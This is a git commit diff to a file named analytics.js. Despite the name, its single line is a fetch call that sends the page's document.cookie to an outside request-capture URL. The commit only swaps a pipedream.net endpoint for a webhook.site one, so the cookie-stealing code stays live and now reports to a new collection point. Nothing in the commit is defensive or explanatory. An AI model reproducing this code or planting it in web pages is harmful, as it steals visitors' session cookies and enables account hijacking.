55a9845d94337d8fd667f367cb975e0be0f642ea
Jetglider808 <76657559+Jetglider808@users.noreply.github.com>
2025-04-26 15:26:21 +1000

    Update analytics.js

--- analytics.js
+++ analytics.js
@@ -1,1 +1,1 @@
-fetch("https://eoyrrc5m6je0tgb.m.pipedream.net/?cookie=" + encodeURIComponent(document.cookie), { method: "GET" });
+fetch("https://webhook.site/4c4d0e1d-6a4a-42f1-8140-053e152d06f8/?cookie=" + encodeURIComponent(document.cookie), { method: "GET" });
